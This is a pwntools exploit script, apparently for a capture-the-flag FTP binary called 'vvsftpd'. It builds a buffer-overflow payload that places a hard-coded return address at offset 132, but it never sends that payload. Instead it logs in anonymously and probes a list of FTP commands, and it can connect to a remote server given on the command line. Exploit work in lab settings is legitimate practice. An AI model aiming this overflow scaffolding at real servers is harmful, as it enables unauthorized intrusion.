from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './vvsftpd'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()

offset = 132

payload = flat({
    offset: [
        0x080485b9,
        0x0
    ]
    })

commands = [
    "MODE", "NLST", "NOOP", "OPTS", "PASS", "PASV",
    "PORT", "PWD", "QUIT", "REIN", "REST", "RETR", "RMD", "RNFR", "RNTO", "SITE",
    "SIZE", "SMNT", "STAT", "STOR", "STOU", "STRU", "SYST", "TYPE", "USER", "XCUP",
    "XCWD", "XMKD", "XPWD", "XRMD"
]

io.sendline(b'user anonymous')
response = io.recvline()
for command in commands:
    io.sendline(command.encode())
    response = io.recvline().strip()  # Read the response for the command
    print(f"Response for {command}: {response.decode()}")
    sleep(1)


io.interactive()



